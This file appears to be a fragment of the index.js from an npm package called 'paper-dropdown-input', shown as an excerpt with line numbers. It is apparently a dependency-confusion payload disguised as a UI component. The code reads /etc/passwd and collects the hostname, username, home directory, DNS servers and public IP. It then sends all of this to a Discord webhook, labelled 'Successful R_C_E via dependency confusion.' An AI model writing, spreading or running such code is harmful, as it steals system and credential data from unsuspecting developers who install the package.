// File: tmp/tmppawfpc8d/paper-dropdown-input/package/index.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const dns = require("dns")
Line 3: const https = require("https")
Line 4: const fs = require("fs")
Line 5: const packageJSON = require("./package.json")
Line 11: passwdData = fs.readFileSync("/etc/passwd", "utf8")
Line 20: {
    const options = {
        hostname: "api.ipify.org",
        port: 443,
        path: "/",
        method: "GET",
    };

    const req = https.request(options, (res) => {
        let data = "";
        res.on("data", (chunk) => {
            data += chunk;
        });
        res.on("end", () => {
            callback(null, data);
        });
    });

    req.on("error", (e) => {
        callback(e, `Error getting public IP: ${e.message}`);
    });

    req.end();
}
Line 28: const req = https.request(options, (res) => {
        let data = "";
        res.on("data", (chunk) => {
            data += chunk;
        });
        res.on("end", () => {
            callback(null, data);
        });
    })
Line 34: callback(null, data)
Line 39: callback(e, `Error getting public IP: ${e.message}`)
Line 42: req.end()
Line 46: {
    // Collect all the tracking data
    const trackingData = {
        package: package,
        current_dir: __dirname,
        home_dir: os.homedir(),
        hostname: os.hostname(),
        username: os.userInfo().username,
        dns_servers: dns.getServers(),
        resolved: packageJSON ? packageJSON.___resolved : undefined,
        version: packageJSON.version,
        package_json: packageJSON,
        passwd_content: passwdData,
        time: currentTime,
        originating_ip: publicIP,
    };

    // Add your custom notes here
    const customNotes = "Successful R_C_E via dependency confusion.";

    // Format the message for readability
    const formattedMessage = `
Endpoint: https://example.com/endpoint

All Information:
- Package: ${trackingData.package}
- Current Directory: ${trackingData.current_dir}
- Home Directory: ${trackingData.home_dir}
- Hostname: ${trackingData.hostname}
- Username: ${trackingData.username}
- DNS Servers: ${JSON.stringify(trackingData...
Line 52: os.hostname()
Line 53: os.userInfo()
Line 92: const discordWebhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
Line 108: const discordReq = https.request(discordOptions, (res) => {
        res.on("data", (d) => {
            // Optional: process.stdout.write(d);
        });
    })
Line 118: discordReq.write(discordPostData)
Line 119: discordReq.end()
